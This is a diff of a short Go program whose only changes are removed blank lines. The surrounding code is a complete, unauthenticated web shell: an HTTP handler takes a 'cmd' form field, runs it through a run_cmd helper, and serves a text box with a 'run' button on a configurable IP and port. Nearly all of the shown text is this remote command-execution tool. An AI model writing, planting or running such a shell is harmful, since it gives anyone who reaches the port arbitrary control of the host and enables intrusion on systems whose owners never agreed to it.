@@ -29,9 +29,7 @@ func run_cmd(cmd string) string {
 }
 
 func handler(w http.ResponseWriter, r *http.Request) {
-
 	fmt.Fprintf(w, "<html>")
-
 	if r.Method == "POST" {
 		r.ParseForm()
 		var cmd string = strings.Join(r.Form["cmd"], " ")
@@ -45,17 +43,13 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprintf(w, "<form action=\"/\" method=\"POST\">" +
 		"<input type=\"text\" name=\"cmd\" size =\"60\" autofocus>"+
 		"<input type=\"submit\" value=\"run\"></html>")
-	
 }
 
 func main() {
-
 	var ip, port string
 	flag.StringVar(&ip, "ip", "", "IP")
 	flag.StringVar(&port, "port", "8080", "Port")
 	flag.Parse()
-
-	
 
 	http.HandleFunc("/", handler)
 	http.ListenAndServe(ip + ":" + port, nil)
